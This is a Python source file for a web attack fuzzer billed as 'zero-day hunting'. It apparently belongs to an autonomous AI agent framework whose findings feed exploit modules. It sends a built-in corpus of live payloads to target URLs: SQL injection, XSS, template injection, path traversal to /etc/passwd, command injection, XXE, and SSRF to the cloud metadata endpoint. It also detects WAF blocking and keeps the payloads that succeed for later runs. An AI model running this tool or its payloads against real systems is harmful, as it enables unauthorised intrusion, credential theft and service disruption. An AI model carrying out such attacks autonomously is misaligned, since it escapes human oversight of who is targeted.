"""TOOL: fuzz_engine - mutation-based attack-surface fuzzer (zero-day hunting).

Fuzzes every parameter/header/path segment with a curated mutation corpus and
scores responses against baseline through five oracles: status-class change,
body fingerprint delta, error-class fingerprints (stack traces!), timing
anomalies, and payload reflection. Findings append to reports/fuzz_findings.json
for tools/crash_triage.py to rank into exploit attempts.
"""
import json, os, re, time

from tools import register
from tools._exploit_lib import paced_send, verdict, body_fingerprint, _pacer

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
FINDINGS_PATH = os.path.join(ROOT, "reports", "fuzz_findings.json")
SEEDS_PATH = os.path.join(ROOT, "reports", "fuzz_seeds.json")


def _scope_path(base_path, fname):
    """W8 (mission-77 autopsy): fuzz findings/seeds are MISSION state.
    The old global reports/ file accumulated every past mission's
    anomalies — cross-mission contamination on read AND write. Inside a
    running mission the corpus lives in its workspace; the global file
    remains the operator-mode fallback."""
    try:
        from core import mission_workspace as _mw
        ws = _mw.get_active()
        d = getattr(ws, "dir", None) if ws is not None else None
        if d:
            return os.path.join(str(d), fname)
    except Exception:
        pass
    return base_path


def _findings_path():
    return _scope_path(FINDINGS_PATH, "fuzz_findings.json")


def _seeds_path():
    return _scope_path(SEEDS_PATH, "fuzz_seeds.json")

MUTATIONS = [
    "'\",", "\"", "'", "`", "<script>alert(1)</script>", "{{7*7}}", "${7*7}",
    "<%= 7*7 %>", "../../etc/passwd", "....//....//etc/passwd", "%2e%2e%2f",
    "%252e%252e%252f", "c:\\windows\\win.ini", "|id", ";id", "$(id)", "`id`",
    "' OR '1'='1", "' UNION SELECT NULL-- ", "1 AND SLEEP(4)", "'; WAITFOR DELAY '0:0:4'-- ",
    "%n%n%n%n%n%n", "%s%s%s%s", "%x.%x.%x", "\x00", "\x00\x00", "A" * 5000,
    "[]", "{}", "null", "true", "-1", "1e309", "0x7fffffff", "NaN",
    "../../", "..\\..\\", "php://filter/convert.base64-encode/resource=index.php",
    "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY a \"xxe\">]><x>&a;</x>",
    "http://127.0.0.1:8080/", "http://169.254.169.254/latest/meta-data/",
    "{{''.__class__.__mro__}}", "#set($x=7*7)$x", "{{constructor.constructor('return 1')()}}",
    "<img src=x onerror=alert(1)>", "javascript:alert(1)", "\uFFFF", "%c0%af",
    {"__proto__": {"isAdmin": True}}, {"$gt": ""}, {"$ne": None},
]

ERROR_FINGERPRINTS = [
    ("python_traceback", r"Traceback \(most recent call last\)", 0.95),
    ("java_stack",       r"(?:Exception in thread|java\.lang\.\w+Exception|javax\.servlet)", 0.9),
    ("php_error",        r"(?:Warning|Fatal error|Parse error):\s", 0.85),
    ("aspnet",           r"(?:Server Error in|System\.\w+Exception|at System\.)", 0.9),
    ("sql_mysql",        r"(?:SQL syntax|MySQL server version|mysqli?_)", 0.92),
    ("sql_pg",           r"(?:PG::|unterminated quoted string|ERROR:\s+syntax error at)", 0.92),
    ("sql_mssql",        r"(?:Unclosed quotation mark|SQL Server|Incorrect syntax near)", 0.92),
    ("sql_sqlite",       r"(?:SQLite3?::|unrecognized token|near \")", 0.9),
    ("template_jinja",   r"(?:jinja2\.exceptions|TemplateSyntaxError|undefined_error)", 0.93),
    ("template_twig",    r"(?:Twig_Error|Twig\\Error)", 0.93),
    ("template_smarty",  r"(?:SmartyCompilerException|smarty)", 0.8),
    ("template_freemarker", r"(?:freemarker\.core|freemarker\.template)", 0.93),
    ("serialization",    r"(?:ObjectInputStream|unserialize|pickle|__reduce__)", 0.95),
    ("path_leak",        r"(?:[A-Z]:\\\\(?:Users|inetpub)|/home/\w+/|/var/www)", 0.75),
    ("waf_blocked",      r"(?:blocked by|request denied|cloudflare|sucuri|alert_id)", 0.2),
]

def _classify(body):
    hits = []
    for name, rx, score in ERROR_FINGERPRINTS:
        if re.search(rx, body or "", re.I):
            hits.append((name, score))
    return hits

def _payload_str(p):
    return json.dumps(p) if isinstance(p, (dict, list)) else str(p)

@register(name="fuzz_attack_surface",
          desc="ZERO-DAY: mutation fuzzer over URL/params/headers with 5-oracle anomaly detection + error-class fingerprinting + optional SecLists dictionary sweep (wordlist='common'|'quickhits'|'raft-small-lower' — name WITHOUT .txt, the code appends it). Findings feed crash_triage. This is where 0days start.",
          params={"type": "object", "properties": {
              "url": {"type": "string", "description": "target URL; {FUZZ} placeholder optional for path/segment fuzzing"},
              "params": {"type": "object", "description": "seed params dict, e.g. {\"q\":\"normal\"}"},
              "headers": {"type": "object", "description": "base headers to send"},
              "max_requests": {"type": "integer", "default": 300},
              "target_param": {"type": "string", "description": "fuzz only this param"},
              "method": {"type": "string", "description": "HTTP method: 'GET' (default) or 'POST'"},
              "wordlist": {"type": "string", "description": "data/wordlists name WITHOUT .txt, e.g. 'common' (the .txt is appended) — applied after the mutation corpus"},
              "seeds": {"type": "object", "description": "learned param values to prepend (pass crash_triage_next's 'fuzz_seeds' here)"},
              "budget_s": {"type": "number", "description": "wall-clock budget for THIS call in seconds (e.g. 120–300 for slow WAF-fronted targets); on expiry returns honest partial findings — never hangs a mission round"}},
              "required": ["url"]},
          danger="careful")
def fuzz_attack_surface(url, params=None, headers=None, max_requests=300,
                        target_param=None, seeds=None, wordlist=None, method="GET",
                        budget_s=0):
    max_requests = max(10, min(int(max_requests or 300), 3_000))  # ROE clamp
    # calib-C fix: 250 requests × 9s WAF RTT = a 40-MINUTE tool call
    # that zombified the mission round loop. budget_s (LLM-chosen, never
    # hidden) wall-clocks the CALL: on expiry the fuzzer stops and
    # returns its findings so far — honest partial, never a hang.
    try:
        budget_s = float(budget_s or 0)
    except (TypeError, ValueError):
        budget_s = 0.0
    _deadline = (time.perf_counter() + budget_s) if budget_s > 0 else None
    # ── V1 munitions: SecLists-backed dictionary sweep after the mutation corpus ──
    _words = []
    if wordlist:
        # R5-2: containment réel — normpath COLLAPSE les "..", realpath NON.
        # Sans cette garde, wordlist="..\..\..\.ssh\id_rsa" lisait n'importe
        # quel fichier lisible et en versait le contenu dans le corpus.
        _wdir = os.path.realpath(os.path.join(ROOT, "data", "wordlists"))
        # C-FZ3b : tolérer une extension passée par erreur — 'common.txt'
        # ne doit pas devenir common.txt.txt (le sweep sautait en silence).
        _wname = str(wordlist)
        if _wname.lower().endswith(".txt"):
            _wname = _wname[:-4]
        _wl = os.path.realpath(os.path.join(_wdir, f"{_wname}.txt"))
        if not _wl.startswith(_wdir + os.sep):
            return ("TOOL ERROR [ARGS]: wordlist refuse (hors data/wordlists/) "
                    f"— {str(wordlist)[:60]}")
        try:
            with open(_wl, encoding="utf-8", errors="replace") as f:
                _words = [l.strip() for l in f
                          if l.strip() and not l.startswith("#")][:800]
        except Exception:
            _words = []
    params = dict(params or {})
    headers = dict(headers or {})
    seeds = dict(seeds or {})
    # corpus: values that survived previous runs — the fuzzer learns between runs
    corpus = {}
    try:
        with open(_seeds_path(), encoding="utf-8") as f:
            corpus = json.load(f)
    except Exception:
        pass
    for pk, vals in list(corpus.items())[:50]:
        # R5-14: le corpus truste la shape des runs passés — un dict en vals[0]
        # ou une liste vide crashait le démarrage. Guard de forme stricte.
        if (isinstance(vals, list) and vals
                and isinstance(vals[0], (str, int, float))
                and pk not in params and pk not in seeds):
            seeds[pk] = vals[0]
    # pre-seeded values from the operator / crash_triage override corpus defaults
    for pk, v in seeds.items():
        params.setdefault(pk, str(v))
    # auto-harvest query-string params as fuzz seeds: /products?id=1 fuzzes id
    from urllib.parse import urlsplit, parse_qsl, urlencode
    split = urlsplit(url)
    base = f"{split.scheme}://{split.netloc}{split.path}"
    if not params and split.query:
        params = {k: v for k, v in parse_qsl(split.query)}
    url = base
    # C-FZ2 + W9 (mission-77 autopsy): {FUZZ} in the URL means PATH fuzzing
    # is requested — the placeholder branch (pname=None) MUST run even when
    # params exist. The old pre-replace turned EVERY request into a literal
    # /FUZZ segment (placeholder artifacts, guaranteed 404s — 80 wasted
    # requests on venice). Param mutations keep a benign token in the path;
    # the path branch mutates the placeholder itself.
    has_fuzz = "{FUZZ}" in url
    url_param_branch = url.replace("{FUZZ}", "FUZZ") if has_fuzz else url
    if has_fuzz and not params and not target_param:
        url_param_branch = url  # pure path fuzzing — no benign rewrite needed
    # baseline
    st0, body0, dt0 = paced_send(url_param_branch, headers=headers, timeout=20)
    fp0 = body_fingerprint(body0)
    base_len = len(body0 or "")
    findings, sent = [], 0

    # Online z-score reference window: the first clean 200-responses define the
    # site's natural length distribution; later anomalies are |x−μ| > 3σ
    # instead of fixed pixel thresholds — noisy sites stop drowning real hits.
    ref = [base_len] if base_len else []
    _z_trigger = 8  # minimum window before σ is meaningful

    def _zflag(length):
        if length and len(ref) >= _z_trigger:
            mu = sum(ref) / len(ref)
            var = sum((x - mu) ** 2 for x in ref) / len(ref)
            sd = max(var ** 0.5, 25.0)   # floor: don't divide noise by ~0
            return abs(length - mu) > 3 * sd
        return False

    param_names = ([target_param] if target_param else list(params.keys())) or [None]
    # W9: {FUZZ} in the URL = path fuzzing requested — the None branch
    # (path mutation) runs in ADDITION to any params, never instead-of.
    if has_fuzz and None not in param_names:
        param_names = [None] + param_names

    for pname in param_names:
        waf_banned = False  # C-FZ1: abort per-param — plus de martèlement du banni
        for mut in (list(MUTATIONS) + _words):
            if sent >= max_requests:
                break
            if _deadline is not None and time.perf_counter() > _deadline:
                break
            pay = _payload_str(mut)
            req_url, req_headers, body = url_param_branch, dict(headers), None
            if pname is None:
                if "{FUZZ}" in url:
                    from urllib.parse import quote
                    req_url = url.replace("{FUZZ}", quote(pay, safe=""))
                else:
                    continue
            else:
                # Ω1.2 (audit-6): Honor method parameter (POST vs GET) & encode dict mutations properly
                is_post = (method or "GET").upper() == "POST"
                data = dict(params)
                data[pname] = mut
                if is_post:
                    # In POST mode, body can be JSON or form-encoded
                    if any(k.lower() == "content-type" and "json" in str(v).lower() for k, v in req_headers.items()) or isinstance(mut, (dict, list)):
                        body = json.dumps(data)
                        if not any(k.lower() == "content-type" for k in req_headers):
                            req_headers["Content-Type"] = "application/json"
                    else:
                        # Clean string conversion for urlencode
                        flat = {k: (json.dumps(v) if isinstance(v, (dict, list)) else v) for k, v in data.items()}
                        body = flat
                else:
                    flat = {k: (json.dumps(v) if isinstance(v, (dict, list)) else v) for k, v in data.items()}
                    req_url = url_param_branch + ("?" + urlencode(flat) if flat else "")
            t0 = time.perf_counter()
            st, resp, dt = paced_send(req_url, method="POST" if body is not None else "GET",
                                      headers=req_headers, body=body, timeout=20)
            dt = round(time.perf_counter() - t0, 3)
            sent += 1
            if st < 0:
                continue
            signals, severity = [], 0.0
            # oracle 1: status class change
            if st0 in (200, 204) and st >= 500:
                signals.append(f"status_5xx({st})"); severity = max(severity, 0.8)
            # oracle 2: fingerprint delta + z-score anomaly
            fp = body_fingerprint(resp)
            if abs(fp[0] - fp0[0]) > max(120, fp0[0] * 0.4):
                signals.append(f"body_delta({fp[0]} vs {fp0[0]})"); severity = max(severity, 0.4)
            if _zflag(len(resp or "")):
                signals.append(f"length_zscore({len(resp or '')}B)"); severity = max(severity, 0.55)
            # oracle 3: error class
            for name, score in _classify(resp):
                if name == "waf_blocked":
                    signals.append("waf_blocking — aborting this param")
                    # C-FZ1: le ban WAF doit être VISIBLE (gate severity >0.3)
                    # — severity dédiée 0.45 au lieu du 0.0 qui supprimait le
                    # finding ; max() garde un signal co-occurrent plus grave.
                    severity = max(severity, 0.45)
                    waf_banned = True
                    break
                signals.append(f"error:{name}")
                severity = max(severity, score)
            # oracle 4: timing
            if dt > max(3.5, dt0 * 5):
                signals.append(f"timing({dt}s vs {dt0}s)"); severity = max(severity, 0.7)
            # oracle 5: reflection
            if pay[:40] in (resp or "") and pay[0] in "<\"'${":
                signals.append("reflected_unsanitized"); severity = max(severity, 0.5)
            if signals and severity > 0.3:
                findings.append({"param": pname or "{FUZZ}", "payload": pay[:200],
                                 "status": st, "severity": round(severity, 2),
                                 "signals": signals, "ts": time.time(),
                                 "url_path": url.split("?")[0][:120]})
            elif st == 200 and len(ref) < 60:
                ref.append(len(resp or ""))  # clean response -> reference window
            if waf_banned:
                break  # C-FZ1: bookkeeping fait (finding enregistré), on ne
                       # martèle plus ce param — le suivant re-démarre à froid

    _save_findings(findings)
    _save_seeds(findings)
    findings.sort(key=lambda f: -f["severity"])
    _expired = (_deadline is not None and time.perf_counter() > _deadline
                and sent < max_requests)
    if _expired:
        summary = (f"budget wall-clock atteint: {len(findings)} anomaly(ies) "
                   f"over {sent}/{max_requests} requests — partial but honest; "
                   f"re-fire with a higher budget_s or narrower target_param "
                   f"to finish the sweep")
        return verdict("fuzz_attack_surface", bool(findings), summary,
                       evidence=[f"{f['param']}={f['payload'][:40]} -> "
                                 f"{f['signals'][0]}"
                                 for f in findings[:12]],
                       findings=findings[:40], requests_sent=sent,
                       triage_hint="run crash_triage_next to rank and map "
                                   "to exploit modules")
    return verdict("fuzz_attack_surface", bool(findings),
                   (f"{len(findings)} anomaly(ies) over {sent} requests — highest severity "
                    f"{findings[0]['severity']} ({findings[0]['signals'][0]})" if findings else
                    f"{sent} requests, target survived clean"),
                   evidence=[f"{f['param']}={f['payload'][:40]} -> {f['signals'][0]}"
                             for f in findings[:12]],
                   findings=findings[:40], requests_sent=sent,
                   triage_hint="run crash_triage_next to rank and map to exploit modules")


def _save_seeds(found):
    """Persist the payload values that produced anomalies — the fuzzer's
    learned corpus for the next run (coverage-feedback, web edition)."""
    try:
        sp = _seeds_path()
        os.makedirs(os.path.dirname(sp), exist_ok=True)
        corpus = {}
        if os.path.exists(sp):
            with open(sp, encoding="utf-8") as f:
                corpus = json.load(f)
        for f in found:
            pk = f.get("param")
            pv = _payload_str(f.get("payload", ""))[:120]
            if pk and pv:
                lst = corpus.setdefault(pk, [])
                if pv not in lst:
                    lst.append(pv)
                corpus[pk] = lst[-40:]
        with open(sp, "w", encoding="utf-8") as f:
            json.dump(corpus, f)
    except Exception:
        pass


def _save_findings(new):
    try:
        fp = _findings_path()
        os.makedirs(os.path.dirname(fp), exist_ok=True)
        existing = []
        if os.path.exists(fp):
            with open(fp, encoding="utf-8") as f:
                existing = json.load(f)
        existing.extend(new)
        with open(fp, "w", encoding="utf-8") as f:
            json.dump(existing[-2000:], f)
    except Exception:
        pass
